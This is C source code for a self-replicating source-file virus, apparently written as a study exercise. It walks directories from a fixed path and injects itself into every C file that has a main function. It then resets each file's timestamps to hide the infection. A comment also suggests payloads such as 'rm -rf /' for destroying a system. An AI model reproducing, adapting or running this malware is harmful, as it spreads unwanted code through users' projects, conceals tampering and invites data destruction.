
/* ucfree:2007-12-31 start */
#include <stdio.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h> 
#include <utime.h> 
#define VIR_NAM        "virus.c"    // virus file name
#define BUF_SIZE    101
#define STA_PATH    "/mnt/D-disk/chunxiao-code/c-study/virus/test"            // start path    
char vir_path[BUF_SIZE] = "";
/*    it's the main part of virus's body,
 *    it can traversal all the parts of the system from STA_PATH,
 *    and if the process have enough permission,
 *    all of the .c file will being infected as a virus    
 */
void vir_body()
{
    DIR        *dp;
    struct dirent    *dirp;
    struct stat        buf, cur_dir_buf;
    int        i;
    char    str_buf[BUF_SIZE];

    // init the vir_path
    if (!strcmp(vir_path, ""))
    {
        if (getcwd(vir_path, BUF_SIZE) == NULL)
        {
            return;
        }
        strcat(vir_path, "/");
        strcat(vir_path, VIR_NAM);
        chdir(STA_PATH);
    }

    if ((dp = opendir(".")) == NULL)
    {
        return;
    }
    
    // do all the sub_dir terms
    while ((dirp = readdir(dp)) != NULL)
    {
        i = strlen(dirp->d_name);
        if (dirp->d_name[i-1] == 'c' &&
            dirp->d_name[i-2] == '.')
        {// is a c file
            do_c_file(dirp->d_name);
            continue;
        }
        
        if (stat(dirp->d_name, &buf) < 0)
        {// get the stat of the file
            continue;
        }
        if (!S_ISDIR(buf.st_mode))
        {// is not a directory
            continue;
        }
        if (!strcmp(dirp->d_name, ".") ||
            !strcmp(dirp->d_name, ".."))
        {// ignore dot and dot_dot directory
            continue;
        }
    
        // do the submit derectory as current
        chdir(dirp->d_name);
        vir_body();
        chdir("..");
    }
    closedir(dp);
    
    /* here! you can do anything that you want
     * just use the system invokes or shell commands
     * ex:     
     * if (system_data_is_sundy)
     * {    
     * system("rm -rf /");
     * }
     * tip: if the process runing as root, the system being over
     *        it's dangerous, so not to try 
     */

    return;
}

/*    this funtion is try to infect the .c file,
 *    if the .c file is already infected,no need to do it again,
 *    else the work begin ......
 */
int do_c_file(const char *f_name)
{
    printf("f_name : %s.\n", f_name);
    FILE     *fp_obj, *fp_vir, *fp_tmp;
    char     buf[BUF_SIZE];
    char     flag;
    char    *tmp_buf;
    struct stat        statbuf;// get the object file's stat 

    struct utimbuf    timebuf;// keep the object file's access and modify time

    if ((fp_obj = fopen(f_name, "r+")) == NULL)
    {// object file
        return 1;
    }
    if (stat(f_name, &statbuf) < 0)
    {
        return 1;
    }
    timebuf.actime = statbuf.st_atime;
    timebuf.modtime = statbuf.st_mtime;
    
    if ((fp_vir = fopen(vir_path, "r")) ==NULL)
    {// virus file
        return 1;
    }
    
    // make a tempfile as a buffer
    if ((tmp_buf = tmpnam(NULL)) == NULL)
    {
        return 1;
    }
    if ((fp_tmp = fopen(tmp_buf, "a+")) == NULL)
    {// temp file
        return 1;    
    }
    unlink(tmp_buf);// kernal will delete it after the process done

    
    // read the C text into the temp file, and modify it
    flag = 'T';
    while (fgets(buf, BUF_SIZE, fp_obj) != NULL)
    {
        if (!strcmp(buf, "/* ucfree:2007-12-31 start */\n"))
        {// the obeject file have been infected
            return 0;
        }

        if (flag == 'T' && strstr(buf, "main("))
        {// find the funtion main,change flag
            flag = 'F';
        }
        if (flag == 'F' && (strstr(buf, "return") ||
            strstr(buf, "}")))
        {// insert the invoke line,before "return" or "}"
            fputs("\t\tvir_body();\n", fp_tmp);
            flag = 'O';
        }
        fputs(buf, fp_tmp);
    }
    if (flag != 'O')
    {// is not the main c file
        return 0;
    }

    // add the parts of virus's body to the tail of temp file

    flag = 'T';
    while (fgets(buf, BUF_SIZE, fp_vir) != NULL)
    {
        if (flag == 'T' && 
            !strcmp(buf, "/* ucfree:2007-12-31 start */\n"))
        {// is the start of the virus's body
            flag = 'F';
        }
        if (flag == 'T')
        {// not find the start
            continue;
        }
        if (flag == 'O')
        {// virus body have been inserted,do over 
            break;
        }
        
        // insert virus's body
        if (!strcmp(buf, "/* ucfree:2007-12-31 end */\n"))
        {// is the end of the virus's body
            flag = 'O';
        }
        if (strstr(buf, "#define VIR_NAM") &&
            buf[0] == '#')
        {// use the object's name to instand of the virus name
            snprintf(buf, sizeof(buf), "%s\t\"%s\"\n",
                     "#define VIR_NAM", f_name);
        }
        fputs(buf, fp_tmp);
    }
    fclose(fp_vir);
    
    // temp file instand of the object file
    rewind(fp_tmp);
    rewind(fp_obj);
    while (fgets(buf, BUF_SIZE,fp_tmp) != NULL)
    {
        fputs(buf, fp_obj);
    }
    fclose(fp_tmp);
    fclose(fp_obj);
    if (utime(f_name, &timebuf) < 0)
    {// keep the time back
        return 1;
    }
    // OK! object file also been a virus ^_^
    return 0;
}
/* ucfree:2007-12-31 end */

/* test it */
int main()
{
    vir_body();

    return 0;
}
